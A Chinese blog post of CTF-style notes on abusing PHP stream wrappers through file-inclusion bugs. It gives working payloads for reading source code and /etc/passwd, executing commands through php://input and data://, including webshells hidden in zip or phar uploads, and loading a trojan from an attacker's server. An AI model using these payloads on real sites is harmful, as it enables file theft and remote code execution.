---
title: "WEB_php伪协议"
image: ''
pinned: false
comment: true
published: 2026-04-16
updated: 2026-04-16
description: "php伪协议"
category: WEB
tags: [WEB]
---



**使用前提的配置文件：**

- **`allow_url_fopen`**：是否允许将 URL（如 http:// 或 ftp://）作为文件处理。
- **`allow_url_include`**：是否允许通过 `include` / `require` 等函数包含（并执行）URL 形式的文件。

 

# 1. `php://`— 访问各个输入/输出流

#### A. `php://filter` (任意文件读取)

- **作用**：主要用于读取本地文件。可以在读取文件之前对内容进行“过滤（转换）”。
- **用法**：直接包含 `index.php` 会被当成 PHP 代码执行，什么都看不到。用 `base64` 编码读取，就能看到 PHP 的源代码（Flag 往往藏在源码注释或变量里）。
- **Payload**：`?file=php://filter/read=convert.base64-encode/resource=index.php`
- **使用环境**：通常不需要开启 `allow_url_fopen` 和 `allow_url_include`。

#### B. `php://input` (代码执行)

- **作用**：可以读取没有处理过的 POST 请求原始数据。
- **用法**：结合文件包含漏洞，将恶意的 PHP 代码放在 POST 请求体中传给服务器执行。
- **Payload**：
  - URL：`?file=php://input`
  - POST Body：`<?php system('cat /flag'); ?>`
- **使用环境**：必须开启 `allow_url_include = On`。



# 2. `file://` — 访问本地文件系统

- **作用**：用于访问本地文件系统中的文件，不受 `allow_url_fopen` 的限制。
- **用法**：当不知道当前的相对路径，或者需要跨目录读取系统敏感文件时。
- **Payload**：
  - Linux：`?file=file:///etc/passwd` 
  - Windows：`?file=file://c:/windows/win.ini`
- **使用环境**：无特殊配置要求，但受限于 PHP 的 `open_basedir`（防跨目录权限配置）。



# 3. `data://` — 数据流包装器

- **作用**：将一段文本直接转化为数据流，常用于执行命令。我们在上一个问题中已经详细见过。
- **用法**：为了防止因为特殊字符导致传参失败，通常配合 Base64 编码使用。
- **Payload**：`?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOyA/Pg==` （这段 base64 解码后是 `<?php system('ls'); ?>`）
- **使用环境**：**极其苛刻**，必须同时满足 `allow_url_fopen = On` 和 `allow_url_include = On`。



# 4. `zip://` , `bzip2://` , `zlib://` — 压缩流包装器

- **作用**：可以访问压缩包文件中的子文件。
- **用法**：常配合“文件上传漏洞”使用。假设服务器只能上传图片（.jpg），你可以把一个包含恶意代码的 `shell.php` 压缩成 `shell.zip`，然后把后缀改成 `shell.jpg` 上传。利用 `zip://` 协议可以直接包含里面的 PHP 文件。
- **Payload**：`?file=zip:///var/www/html/upload/shell.jpg%23shell.php`
  - *注意两点：* `zip://` 后面必须跟绝对路径；压缩包和内部文件名之间用 `#` 分隔，但在 URL 中提交时，`#` url编码为 `23`。
- **使用环境**：不需要开启 `allow_url_fopen` 和 `allow_url_include`。



# 5. `phar://` — PHP 归档文件

- **作用**：与 `zip://` 类似，用于访问 `.phar` 压缩包内部的文件。
- **用法**：除了用于文件包含绕过（类似 zip），`phar://` 常常运用在于 **php 反序列化漏洞**。任何文件操作函数（如 `file_exists()`, `filesize()`, `unlink()` 等）只要解析了 `phar://` 开头的路径，就会自动对压缩包内的 metadata 进行反序列化，从而触发代码执行。
- **Payload**：`?file=phar:///var/www/html/upload/shell.jpg/shell.php`
- **使用环境**：PHP 版本 >= 5.3.0。不需要开启 `allow_url_fopen` 和 `allow_url_include`。



# 6. `http://` 和 `https://` — URL 流

- **作用**：包含远程服务器上的文件（即 RFI，远程文件包含漏洞）。
- **用法**：你在自己的服务器上放一个写满木马的 `shell.txt`，然后让目标服务器去加载它。
- **Payload**：`?file=http://服务器IP/shell.txt`
- **使用环境**：必须同时开启 `allow_url_fopen = On` 和 `allow_url_include = On`。（现代 PHP 环境默认关闭 `allow_url_include`，难以触发）。





## 核心配置要求

| **伪协议**               | **需要 allow_url_fopen** | **需要 allow_url_include (若要执行)** | **常见用途**              |
| ------------------------ | ------------------------ | ------------------------------------- | ------------------------- |
| **`file://`**            | 否                       | 否                                    | 读取系统本地文件          |
| **`php://filter`**       | 否                       | 否                                    | 读取本地源码 (base64绕过) |
| **`php://input`**        | 否                       | 是                                    | POST 传参执行任意代码     |
| **`zip://` / `phar://`** | 否                       | 否                                    | 绕过文件后缀限制包含木马  |
| **`data://`**            | 是                       | 是                                    | 注入数据流执行代码        |
| **`http://`**            | 是                       | 是                                    | 远程文件包含 (RFI)        |





# 检查配置文件操作：



### 1.寻找或执行 `phpinfo()`

`phpinfo()` 是 PHP 中的一个函数，它会输出服务器上所有 PHP 的配置信息。这是获取 `allow_url_fopen` 和 `allow_url_include` 状态最准的地方。

- **如果存在信息泄露：**可以尝试在网站目录下访问这些常见的敏感路径：
  - `/info.php`
  - `/phpinfo.php`
  - `/test.php`
  - `/tz.php` 
  - 如果能打开页面，直接在页面里 `Ctrl+F` 搜索 `allow_url_include` 即可。页面上通常会有 `Local Value`（当前目录生效的值）和 `Master Value`（全局配置的值），看 `Local Value` 即可。



### 2. 代码执行获取：使用 `ini_get()`

如果发现了一个漏洞，能够执行简短的 PHP 代码，但回显的内容有限（比如无法显示庞大的 phpinfo 页面），你可以使用 `ini_get()` 函数精准读取这两个配置：

- **读取 allow_url_fopen：** `<?php echo ini_get('allow_url_fopen'); ?>`
- **读取 allow_url_include：** `<?php echo ini_get('allow_url_include'); ?>`

*(注：如果页面回显 `1`，代表 `On` / 开启；如果没有任何回显或者回显 `0`，代表 `Off` / 关闭。)*



### 3. 间接盲测：利用报错信息推断

如果你什么探针都找不到，也没有代码执行权限，那就只能通过故意触发错误来推断配置状态了。前提是网站开启了错误提示（`display_errors = On`）。

假设网站有一个文件包含漏洞点：`?file=xxx`

**A. 盲测 `allow_url_fopen` (URL 打开权限)** 你可以尝试让服务器去读取一个不存在的外部网址，或者你自己的服务器地址：

- **Payload:** `?file=http://www.google.com/` (或者 IP)
- **观察报错：**
  - 如果报错信息包含：`failed to open stream: no suitable wrapper could be found` 或者 `URL file-access is disabled in the server configuration` -> 说明 `allow_url_fopen = Off`。
  - 如果报错是 `failed to open stream: HTTP request failed!`（说明它尝试去请求了，但没请求到） 或者页面长时间加载最后超时 -> 说明`allow_url_fopen = On`。

**B. 盲测 `allow_url_include`** 在使用 `include()` 包含外部 URL 时：

- **Payload:** 同样尝试 `?file=http://IP/`
- **观察报错：**
  - 如果报错明确提到 `URL file-include is disabled in the server configuration` -> 说明 `allow_url_include = Off`。



### 4. CT猜测

1. **现代 PHP 版本默认关闭：** 在 PHP 5.2 之后，`allow_url_include` 默认就是 Off 的。除非出题人为了考 `http://` 或 `data://` 伪协议故意把它打开，否则默认当它关闭处理。
2. **题目暗示：** 如果题目明显过滤了 `php://` 或者本地路径的关键字，暗示你必须用外部请求，那出题人肯定偷偷开了 `allow_url_include`。
3. **无脑试 `php://filter`：** 无论什么配置，`php://filter` 几乎都是畅通无阻的（因为它不依赖这两个配置）。所以实战中，遇到文件包含，第一步永远是先用 `php://filter` 尝试读取源码，读不到再去考虑其他的。

















---

- **版权声明**：本文由 **余林阳** 创作，转载请注明出处。
